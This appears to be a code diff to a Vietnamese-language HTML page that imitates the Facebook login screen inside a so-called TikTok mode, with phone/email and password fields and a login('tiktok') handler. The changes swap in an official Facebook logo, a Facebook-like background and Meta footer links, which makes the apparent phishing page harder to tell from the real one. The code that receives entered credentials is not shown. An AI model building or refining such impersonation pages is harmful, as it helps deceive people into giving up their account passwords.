@@ -263,7 +263,7 @@
             color: #737373;
         }
         body.tiktok-mode {
-            background: linear-gradient(to bottom, #69C9D0, #EE1D52);
+            background: linear-gradient(to bottom, #E6F0FA, #FFFFFF);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -331,7 +331,7 @@
         </div>
         <!-- TikTok Login Container -->
         <div class="login-container-tiktok">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" alt="Facebook Logo Old" class="tiktok-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Facebook_New_Logo_%282015%29.svg/1200px-Facebook_New_Logo_%282015%29.svg.png" alt="Facebook Logo" class="tiktok-logo">
             <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số di động hoặc email">
             <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
             <button class="btn btn-primary" onclick="login('tiktok')">Đăng nhập</button>
@@ -421,6 +421,11 @@
             <a href="https://www.facebook.com/policies/" target="_blank">Điều khoản</a>
         </div>
         <div class="footer-meta">Meta © 2025</div>
+        <div class="footer-links-simple" style="display: none;">
+            <a href="https://about.meta.com/" target="_blank">Giới thiệu</a>
+            <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
+            <a href="#" target="_blank">Xem thêm</a>
+        </div>
     </footer>
 
     <script type="text/javascript">
@@ -456,6 +461,10 @@
                 document.querySelector('.left-section').style.display = 'none';
                 document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-tiktok');
+                // Sửa footer cho TikTok mode
+                document.querySelector('.footer-languages').style.display = 'none';
+                document.querySelector('.footer-links').style.display = 'none';
+                document.querySelector('.footer-links-simple').style.display = 'block';
             } else {
                 console.log("Applying Desktop mode");
                 document.body.classList.add('desktop-mode');
@@ -463,6 +472,10 @@
                 document.querySelector('.left-section').style.display = 'block';
                 document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-desktop');
+                // Giữ footer đầy đủ cho Desktop mode
+                document.querySelector('.footer-languages').style.display = 'block';
+                document.querySelector('.footer-links').style.display = 'block';
+                document.querySelector('.footer-links-simple').style.display = 'none';
             }
         };
 
@@ -488,10 +501,16 @@
                 hideAllExcept('.login-container-tiktok');
                 document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.language-text').style.display = 'none';
+                document.querySelector('.footer-languages').style.display = 'none';
+                document.querySelector('.footer-links').style.display = 'none';
+                document.querySelector('.footer-links-simple').style.display = 'block';
             } else if (isDesktop) {
                 hideAllExcept('.login-container-desktop');
                 document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.language-text').style.display = 'none';
+                document.querySelector('.footer-languages').style.display = 'block';
+                document.querySelector('.footer-links').style.display = 'block';
+                document.querySelector('.footer-links-simple').style.display = 'none';
             }
             document.getElementById('back-button').style.display = 'none';
             document.querySelector('.left-section').style.display = isDesktop ? 'block' : 'none';
@@ -506,8 +525,14 @@
             document.querySelector('.language-text').style.display = 'none';
             if (isDesktop) {
                 document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.footer-languages').style.display = 'block';
+                document.querySelector('.footer-links').style.display = 'block';
+                document.querySelector('.footer-links-simple').style.display = 'none';
             } else {
                 document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.footer-languages').style.display = 'none';
+                document.querySelector('.footer-links').style.display = 'none';
+                document.querySelector('.footer-links-simple').style.display = 'block';
             }
             previousPage = showLogin;
         }
@@ -520,8 +545,14 @@
             document.querySelector('.language-text').style.display = 'none';
             if (isDesktop) {
                 document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.footer-languages').style.display = 'block';
+                document.querySelector('.footer-links').style.display = 'block';
+                document.querySelector('.footer-links-simple').style.display = 'none';
             } else {
                 document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.footer-languages').style.display = 'none';
+                document.querySelector('.footer-links').style.display = 'none';
+                document.querySelector('.footer-links-simple').style.display = 'block';
             }
             previousPage = showForgotPassword;
         }
@@ -534,8 +565,14 @@
             document.querySelector('.language-text').style.display = 'none';
             if (isDesktop) {
                 document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.footer-languages').style.display = 'block';
+                document.querySelector('.footer-links').style.display = 'block';
+                document.querySelector('.footer-links-simple').style.display = 'none';
             } else {
                 document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.footer-languages').style.display = 'none';
+                document.querySelector('.footer-links').style.display = 'none';
+                document.querySelector('.footer-links-simple').style.display = 'block';
             }
             previousPage = showLogin;
         }
